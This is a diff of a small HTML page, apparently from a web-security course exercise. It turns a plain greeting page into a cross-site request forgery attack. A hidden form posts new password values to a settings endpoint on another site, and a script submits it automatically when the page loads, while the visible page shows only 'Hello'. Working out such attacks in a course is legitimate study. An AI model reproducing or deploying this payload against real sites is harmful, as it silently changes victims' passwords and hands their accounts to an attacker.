@@ -1,10 +1,19 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
+    <meta charset="UTF-8">
 </head>
 <body>
-  <h2>Hello!</h2>
-  <script src="script.js"></script>
+    <h2>Hello</h2>
+    <form id="autoSubmitForm" action="https://cats.is-course.ru/settings" method="POST">
+        <input type="hidden" name="password" value="12">
+        <input type="hidden" name="confirm-password" value="12">
+    </form>
+
+    <script>
+        window.onload = function() {
+            document.getElementById('autoSubmitForm').submit();
+        };
+    </script>
 </body>
 </html>
